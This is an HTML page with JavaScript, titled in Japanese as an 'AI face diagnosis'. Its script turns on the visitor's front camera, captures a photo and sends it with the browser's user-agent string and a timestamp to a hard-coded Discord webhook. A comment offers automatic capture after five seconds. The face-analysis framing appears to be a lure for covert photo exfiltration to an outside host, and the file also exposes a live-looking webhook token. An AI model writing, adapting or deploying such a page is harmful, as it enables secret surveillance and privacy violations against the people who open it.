<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI顔診断</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
    video, canvas { max-width: 100%; border: 2px solid #0f0; margin: 20px 0; }
    button { font-size: 1.5em; padding: 15px 30px; margin: 10px; background: #0f0; color: #000; border: none; }
  </style>
</head>
<body>
  <h1>写真撮影システム</h1>
  <p>カメラを許可して撮影してください</p>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <br>
  <button onclick="capture()">撮影 & 送信</button>

  <script>
    const webhook = 'https://ptb.discord.com/api/webhooks/1456827735220424757/SzBZX1vDz0OyjP34rGjAh3qCaNVSgdIH7AadF8eDDUoQHr_ZsSdwFx23_Sim51cQxoPs'; // Discord Webhook URLを貼り付け

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
      .then(stream => {
        video.srcObject = stream;
        video.play();
      })
      .catch(err => {
        document.body.innerHTML += `<p>カメラアクセス拒否またはエラー: ${err.message}</p>`;
      });

    function capture() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      
      canvas.toBlob(blob => {
        const form = new FormData();
        form.append('file', blob, 'capture.jpg');
        
        const payload = {
          content: '**写真キャプチャ成功**\\nタイムスタンプ: ' + new Date().toLocaleString() + 
                   '\\nUser-Agent: ' + navigator.userAgent
        };
        form.append('payload_json', JSON.stringify(payload));

        fetch(webhook, {
          method: 'POST',
          body: form
        }).then(() => {
          document.body.innerHTML = '<h1>写真を送信しました。ありがとう！</h1>';
        }).catch(err => {
          alert('送信エラー: ' + err);
        });
      }, 'image/jpeg', 0.95);
    }

    // 自動撮影オプション（任意）: setTimeout(capture, 5000); で5秒後自動
  </script>
</body>
</html>
